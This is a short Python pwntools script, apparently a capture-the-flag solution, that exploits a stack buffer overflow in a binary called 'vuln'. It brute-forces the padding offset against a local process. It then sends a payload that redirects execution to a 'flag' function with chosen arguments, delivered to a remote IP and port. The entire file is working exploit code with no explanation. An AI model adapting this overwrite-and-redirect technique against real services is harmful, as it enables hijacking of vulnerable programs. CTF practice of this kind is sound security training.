#!/usr/bin/env python3

from pwn import *
import sys

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print('Usage: writup.py IP:ADDRESS')
        exit(1)

    context.binary = 'vuln'
    elf = ELF('./vuln')
    print(elf)
    exploit = pack(elf.symbols['flag']) + b'\x80' * 4 + pack(0xdeadbeef) + pack(0xc0ded00d)
    offset = 0
    for i in range(180, 200):
        with process('./vuln') as proc:
            proc.recvline()
            proc.sendline(b' ' * i + exploit)
            proc.recvline()
            try:
                print(proc.recvline())
                offset = i
                break
            except EOFError:
                pass

    ip, port = sys.argv[1].split(':')
    with remote(ip, port) as rem:
        rem.recvline()
        rem.sendline(b'A' * offset + exploit)
        rem.recvline()
        warn(rem.recvuntil(b'}'))
